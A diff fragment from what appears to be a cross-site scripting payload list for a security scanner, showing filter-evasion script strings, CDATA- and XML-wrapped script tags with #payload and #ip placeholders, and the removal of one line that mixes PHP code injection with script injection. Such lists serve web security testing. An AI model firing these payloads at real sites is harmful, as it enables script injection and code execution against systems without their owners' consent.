@@ -48,7 +48,6 @@
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--
 <SCRIPT ID=#payload>#ip</SCRIPT>=&{}
 ##'';!--"<XSS>=&{()}
-<name>','')); phpinfo(); exit;/*</name><script id=#payload>#ip</script>
 <![CDATA[<script id=#payload>#ip</script>]]>
 <![CDATA[<]]>SCRIPT ID=#payload<![CDATA[>]]>#ip;<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
 <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT ID=#payload<![CDATA[>]]>#ip<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
